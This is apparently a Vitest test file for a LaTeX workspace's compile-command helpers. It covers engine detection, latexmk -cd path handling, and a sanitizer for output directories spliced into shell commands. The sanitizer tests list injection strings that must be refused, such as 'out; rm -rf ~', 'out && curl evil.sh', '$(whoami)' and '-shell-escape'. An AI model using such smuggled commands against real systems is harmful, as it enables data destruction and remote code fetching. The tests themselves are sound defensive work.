import { describe, it, expect } from 'vitest';
import {
	compileOutDir,
	detectEngine,
	usesLatexmk,
	buildCompileCommand,
	resolveOutputPath,
	detectedPdfPath,
	expectedPdfPath,
	expectedLogPath,
	outputPathIssue,
	sanitizeOutputDir,
	withOutputDir,
	usesCd,
	compileBaseDir
} from '$lib/workspace/compileCommand';
import { DEFAULT_COMPILE_COMMAND } from '$lib/settings';

// a latexmk command WITHOUT -cd: the shape a user gets by deleting the flag, and what the shipped
// default looked like before it carried one. DEFAULT_COMPILE_COMMAND is used where the assertion is
// about the real shipped value.
const DEFAULT = 'latexmk -lualatex -interaction=nonstopmode -file-line-error -synctex=1 -output-directory=output {main}';

describe('compileCommand', () => {
	it('reads the output directory, defaulting to .', () => {
		expect(compileOutDir(DEFAULT)).toBe('output');
		expect(compileOutDir('pdflatex {main}')).toBe('.');
		expect(compileOutDir('latexmk -outdir="my out" {main}')).toBe('my out');
	});

	it('detects the engine (or null for the unrecognized)', () => {
		expect(detectEngine(DEFAULT)).toBe('lualatex');
		expect(detectEngine('xelatex {main}')).toBe('xelatex');
		expect(detectEngine('pdflatex {main}')).toBe('pdflatex');
		expect(detectEngine('latexmk -pdf {main}')).toBe('pdflatex');
		expect(detectEngine('make')).toBeNull();
		expect(detectEngine('tectonic {main}')).toBeNull();
		expect(usesLatexmk(DEFAULT)).toBe(true);
		expect(usesLatexmk('pdflatex {main}')).toBe(false);
	});

	it('regenerates a command carrying the output dir over', () => {
		expect(buildCompileCommand('xelatex', true, DEFAULT)).toBe(
			'latexmk -xelatex -interaction=nonstopmode -file-line-error -synctex=1 -output-directory=output {main}'
		);
		expect(buildCompileCommand('pdflatex', false, 'pdflatex {main}')).toBe(
			'pdflatex -interaction=nonstopmode -file-line-error -synctex=1 -output-directory=output {main}'
		);
	});

	it('resolves detected and overridden output paths', () => {
		const root = '/proj';
		const main = '/proj/main.tex';
		expect(detectedPdfPath(DEFAULT, root, main)).toBe('/proj/output/main.pdf');
		expect(detectedPdfPath('pdflatex {main}', root, main)).toBe('/proj/main.pdf');
		expect(detectedPdfPath(DEFAULT, null, main)).toBeNull();
		// a relative override is joined to root; absolute stays put
		expect(resolveOutputPath(root, 'build/out.pdf')).toBe('/proj/build/out.pdf');
		expect(resolveOutputPath(root, '/abs/out.pdf')).toBe('/abs/out.pdf');
		expect(expectedPdfPath(DEFAULT, root, main, 'build/x.pdf')).toBe('/proj/build/x.pdf');
		// the log sits next to the actual pdf, following the override
		expect(expectedLogPath(DEFAULT, root, main)).toBe('/proj/output/main.log');
		expect(expectedLogPath(DEFAULT, root, main, { pdf: 'build/x.pdf' })).toBe('/proj/build/x.log');
		expect(expectedLogPath('latexmk -auxdir=aux -output-directory=out {main}', root, main)).toBe('/proj/aux/main.log');
	});

	it('flags bad Advanced output paths', () => {
		expect(outputPathIssue('', '.pdf')).toBeNull();
		expect(outputPathIssue('out/main.pdf', '.pdf')).toBeNull();
		expect(outputPathIssue('{main}.pdf', '.pdf')).toBe('has-token');
		expect(outputPathIssue('main.tex', '.pdf')).toBe('wrong-ext');
	});
});

// latexmk -cd: the compile runs in the main file's own directory instead of the workspace root.
// A main file in a subfolder cannot otherwise find its own \input siblings, because TeX resolves
// those against the working directory and the terminal's is the root.
//
// Everything the app computes from the command has to move with it. The one property worth stating
// outright: the flag is IN the command text, so what the modal shows, what the shell runs, and what
// the PDF preview looks for are all read from the same string and cannot disagree.
describe('latexmk -cd', () => {
	const CD = 'latexmk -cd -lualatex -synctex=1 -output-directory=output {main}';
	const root = '/proj';
	const sub = '/proj/latex/main.tex';

	// the value that actually ships, not a copy of it: the quick-setup row reads the command back to
	// decide which chip is raised, so a default the detectors cannot parse would leave every chip
	// dark on a fresh install
	it('leaves the shipped default fully readable by the row', () => {
		expect(detectEngine(DEFAULT_COMPILE_COMMAND)).toBe('lualatex');
		expect(usesLatexmk(DEFAULT_COMPILE_COMMAND)).toBe(true);
		expect(usesCd(DEFAULT_COMPILE_COMMAND)).toBe(true);
		expect(compileOutDir(DEFAULT_COMPILE_COMMAND)).toBe('output');
		expect(detectedPdfPath(DEFAULT_COMPILE_COMMAND, root, sub)).toBe('/proj/latex/output/main.pdf');
	});

	it('reads the flag, and reads -cd- as the off switch it is', () => {
		expect(usesCd(CD)).toBe(true);
		expect(usesCd('latexmk -cd- -lualatex {main}')).toBe(false); // explicit opt-out
		expect(usesCd(DEFAULT)).toBe(false);
		expect(usesCd('latexmk -cd')).toBe(true); // end of string
		expect(usesCd('latexmk -outdir=cd {main}')).toBe(false); // a value, not the flag
	});

	it('runs in the main file directory, and only when it differs', () => {
		expect(compileBaseDir(CD, root, sub)).toBe('/proj/latex');
		expect(compileBaseDir(CD, root, '/proj/main.tex')).toBe(root); // at the root: a no-op
		expect(compileBaseDir(DEFAULT, root, sub)).toBe(root); // no flag, no change
		expect(compileBaseDir(CD, null, sub)).toBeNull();
	});

	// paths built from the base are compared against native ones elsewhere; a mixed C:\proj/latex
	// would miss those exact matches
	it('keeps the root separator style', () => {
		expect(compileBaseDir(CD, 'C:\\proj', 'C:\\proj\\latex\\main.tex')).toBe('C:\\proj\\latex');
		expect(detectedPdfPath(CD, 'C:\\proj', 'C:\\proj\\latex\\main.tex')).toBe('C:\\proj\\latex\\output\\main.pdf');
	});

	// the coupled half: -cd alone would compile fine and leave the preview watching a file that is
	// never written
	it('moves the detected PDF and log with it', () => {
		expect(detectedPdfPath(CD, root, sub)).toBe('/proj/latex/output/main.pdf');
		expect(expectedLogPath(CD, root, sub)).toBe('/proj/latex/output/main.log');
		expect(detectedPdfPath('latexmk -cd {main}', root, sub)).toBe('/proj/latex/main.pdf'); // no outdir
		expect(expectedLogPath('latexmk -cd -auxdir=aux -output-directory=out {main}', root, sub)).toBe('/proj/latex/aux/main.log');
		// the root case is untouched, which is what makes this safe to turn on by default
		expect(detectedPdfPath(CD, root, '/proj/main.tex')).toBe('/proj/output/main.pdf');
	});

	// a manual override is a literal path the user typed against the folder root; -cd must not
	// second-guess it
	it('leaves an Advanced output override alone', () => {
		expect(expectedPdfPath(CD, root, sub, 'build/x.pdf')).toBe('/proj/build/x.pdf');
	});

	// The quick-setup row is a two-way control: the chips WRITE the command and the same command
	// decides which chip is raised. Adding a flag to what buildCompileCommand emits is exactly the
	// kind of change that can make a generated command unreadable to its own detectors, so every
	// combination the row can produce is round-tripped back through them.
	it('round-trips every chip combination through the detectors', () => {
		for (const engine of ['pdflatex', 'lualatex', 'xelatex'] as const) {
			for (const latexmk of [true, false]) {
				for (const from of [DEFAULT, CD, 'pdflatex {main}', 'make paper']) {
					const out = buildCompileCommand(engine, latexmk, from);
					const label = `${engine} latexmk=${latexmk} from=${from}`;
					expect(detectEngine(out), label).toBe(engine);
					expect(usesLatexmk(out), label).toBe(latexmk);
					expect(compileOutDir(out), label).toBe('output');
					// -cd survives only where it means something: latexmk, and either the source
					// command already had it or latexmk is being switched on from a bare engine
					expect(usesCd(out), label).toBe(latexmk && (usesCd(from) || !usesLatexmk(from)));
				}
			}
		}
	});

	it('carries the flag through an engine change, and a deletion stays deleted', () => {
		expect(buildCompileCommand('xelatex', true, CD)).toContain('latexmk -cd -xelatex');
		// the user removed -cd by hand: clicking a chip must not put it back
		expect(buildCompileCommand('xelatex', true, DEFAULT)).not.toContain('-cd');
		// a bare engine has no such flag
		expect(buildCompileCommand('pdflatex', false, CD)).not.toContain('-cd');
		// turning latexmk on is a request for the stock latexmk setup, which includes it
		expect(buildCompileCommand('pdflatex', true, 'pdflatex -output-directory=output {main}')).toContain('latexmk -cd -pdf');
	});
});

// The MCP set_output_paths tool splices a caller-supplied directory into a shell command line, and it
// is the only tool that reaches one. sanitizeOutputDir is the entirety of what makes that safe, so it
// is tested as a boundary, not as a formatter.
describe('sanitizeOutputDir', () => {
	it('accepts ordinary relative, nested and absolute directories', () => {
		expect(sanitizeOutputDir('output')).toBe('output');
		expect(sanitizeOutputDir('build/paper')).toBe('build/paper');
		expect(sanitizeOutputDir('../shared/build')).toBe('../shared/build'); // monorepos build out of tree
		expect(sanitizeOutputDir('.build')).toBe('.build');
		expect(sanitizeOutputDir('/var/tmp/out')).toBe('/var/tmp/out');
		expect(sanitizeOutputDir('C:/builds/paper')).toBe('C:/builds/paper');
	});

	it('folds Windows separators, which also removes the POSIX escape character', () => {
		expect(sanitizeOutputDir('build\\paper')).toBe('build/paper');
		expect(sanitizeOutputDir('C:\\builds')).toBe('C:/builds');
	});

	it('quotes a directory containing spaces, so it stays ONE argument', () => {
		expect(sanitizeOutputDir('my build')).toBe('"my build"');
		expect(sanitizeOutputDir('  padded  ')).toBe('padded'); // trimmed, so no needless quoting
	});

	it('refuses every shell metacharacter', () => {
		for (const bad of [
			'out; rm -rf ~',
			'out && curl evil.sh',
			'out | tee /etc/passwd',
			'$(whoami)',
			'`whoami`',
			'out$HOME',
			'out"quoted',
			"out'quoted",
			'out\nsecond',
			'out>file',
			'out<file',
			'a{b,c}',
			'out&'
		])
			expect(sanitizeOutputDir(bad), bad).toBeNull();
	});

	it('refuses a leading dash, which the engine would read as another flag', () => {
		expect(sanitizeOutputDir('-shell-escape')).toBeNull();
		expect(sanitizeOutputDir('--output')).toBeNull();
	});

	it('refuses nothing at all', () => {
		expect(sanitizeOutputDir('')).toBeNull();
		expect(sanitizeOutputDir('   ')).toBeNull();
	});
});

describe('withOutputDir', () => {
	it('substitutes in place, keeping every other flag', () => {
		expect(withOutputDir(DEFAULT, 'build')).toBe(
			'latexmk -lualatex -interaction=nonstopmode -file-line-error -synctex=1 -output-directory=build {main}'
		);
		// the separator style the command already used is preserved
		expect(withOutputDir('pdflatex -output-directory out {main}', 'build')).toBe('pdflatex -output-directory build {main}');
		expect(withOutputDir('latexmk -outdir=old {main}', 'new')).toBe('latexmk -outdir=new {main}');
		expect(withOutputDir('latexmk -outdir="old dir" {main}', 'new')).toBe('latexmk -outdir=new {main}');
	});

	it('inserts before {main} when the command has no such flag', () => {
		// after the file name it is ignored by some engines and taken as a job name by others
		expect(withOutputDir('pdflatex {main}', 'build')).toBe('pdflatex -output-directory=build {main}');
		expect(withOutputDir('make paper', 'build')).toBe('make paper -output-directory=build');
	});

	it('treats the directory as a literal, not a replacement pattern', () => {
		// '$&' and friends are special to String.replace; a sanitized dir cannot contain them, but
		// the function must not depend on that to stay correct
		expect(withOutputDir('pdflatex -outdir=a {main}', '"my build"')).toBe('pdflatex -outdir="my build" {main}');
	});

	it('round-trips with compileOutDir', () => {
		for (const dir of ['build', 'build/paper', '../out']) expect(compileOutDir(withOutputDir(DEFAULT, dir))).toBe(dir);
	});
});
